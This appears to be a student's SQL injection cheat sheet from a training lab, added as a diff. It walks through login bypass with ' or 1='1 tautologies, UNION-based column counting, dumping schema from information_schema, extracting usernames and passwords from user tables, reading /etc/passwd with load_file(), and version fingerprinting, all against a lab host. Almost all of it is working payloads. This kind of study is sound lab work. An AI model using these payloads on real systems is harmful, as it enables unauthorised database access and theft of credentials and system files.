@@ -1,0 +1,173 @@
+#standard commands
+SELECT          extracts data from a database 
+UNION           Used to combine the result-set of two or more SELECT statements
+#going to pair union command with select command
+
+method 1:
+mysql 
+mysql --user=<username> --pass=<password> #use if you do not have access
+
+show databases;
+#default databases
+  information_schema: Database of database, provides list od all databases, tables, and columns
+  mysql: mysql user list
+  performance_schema: metrics of SQL server
+
+#show tables in a database
+show tables from information_schema;
+
+#view column in a table from a datbase
+select * from session.<database>;
+
+
+method 2:
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+1. determine the behavior
+username=matt
+password=password
+#this did not work
+
+2.determine if webpage is vulnerable to SQL injection
+username=matt' or 1='1
+password=password' or 1='1
+#this did work
+
+3.Retrieved/Dump information using Get method
+#### pay attention to the format of the web address; username and password may be spelt different ####
+http://10.50.21.1/login.php?username=matt'+or+1='1&passwd=password'+or+1='1
+#find the field and how they spell them in console tab > network> request after sending the or password
+
+#SQL injection - POST method
+0. Determine normalbehavior
+Only valid entries will provide information
+
+1. Determine if the webpage is vulnerable via Truth statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+2. Determine the number of columns from the table that the webpage is displaying
+#webpage
+columns: 4   <=== start with lowest number
+rows: 5
+
+<value>' UNION select 1,2,3,4       <==== nope
+<value>' UNION select 1,2,3,4;      <==== nope
+<value>' UNION select 1,2,3,4; #    <==== nope
+#the table has more that 4 columns
+#fuze up
+<value>' UNION select 1,2,3,4,5       <==== nope
+<value>' UNION select 1,2,3,4,5;      <==== nope
+<value>' UNION select 1,2,3,4,5; #    <==== works
+
+3. Determine the number of columns, order, and hidden
+Audi' UNION select 1,2,3,4,5; #    <==== works        Manufacturer	Cost	Color	Year
+                                                           Audi 	  22000  red 2134
+                                                             1    	  3 	  4 	  5
+columns = 5
+order: 1,3,4,5
+hidden: 2
+
+4. Extract information via Golden Statement
+Golden statement:
+select table_schema,table_name,column_name from information_schema.columns; #
+
+<value>' UNION select 1,2,3,4,5; #
+<value>' UNION select table_schema,table_name,column_name,1,2 from information_schema.columns; #
+#need to add padding because of the difference in number of columns
+1             |2          |3          |4  |5
+table_schema  table_name  column_name  1  2
+
+Hidden: 2
+#since column 2 is hidden, it needs a place holder
+<value>' UNION select table_schema,null,table_name,column_name,1 from information_schema.columns; #
+1             |2          |3          |4           |5
+table_schema  null        table_name  column_name  1  
+
+<value>' UNION select studentID,null,username,passwd,null from session.userinfo; #
+
+
+#SQL injection - GET method
+0. Determine the normal behavior
+Goodyear
+http://10.50.21.1/uniondemo.php?Selection=1&Submit=Submit
+Cooper
+http://10.50.21.1/uniondemo.php?Selection=2&Submit=Submit
+Bridgestone
+http://10.50.21.1/uniondemo.php?Selection=3&Submit=Submit
+General
+http://10.50.21.1/uniondemo.php?Selection=4&Submit=Submit
+
+1. Determine if the webpage is vulnerable via Truth statement
+Truth statement
+#normally don't need qutoes for GET method
+<value> or 1=1
+<value> or 1=1;
+<value> or 1=1; #
+
+2. Determine the number of columns from the table that the webpage is displaying
+Webpage
+columns: 3  <=== start with lowest number
+Rows: 5
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3;
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
+
+3. Determin the number of columns, order, and hidden
+Columns: 3
+Order: 1,3,2
+Hidden: N/A
+
+Backend
+1   |2   |3
+
+Webpage
+1   |3   |2
+
+4. Extract information via Golden Statement
+Golden statement:
+select table_schema,table_name,column_name from information_schema.columns; #
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns; #
+#the coloumns are reversed whne displayed
+Backend
+1         |2      |3
+t_schema  t_name  column_name
+
+Webpage
+1         |3           |2
+t_schema  column_name  t_name
+
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
+#flip it to make it readable
+Backend
+1         |2      |3
+t_schema  column_name  t_name
+
+Webpage
+1         |3           |2
+t_schema  t_name  column_name
+
+5. Extracting Desired Information
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select name,id,pass from session.user; #
+
+
+#SQL injection - Extra
+#version
+#@@version
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,@@version; #
+#find the sql version the server is running
+#using @@version right after fuze b/c we know that the correct number of columns
+
+#function
+#load_file()
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd'); #
+
+#filtering
+http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema='session'; #
+
+
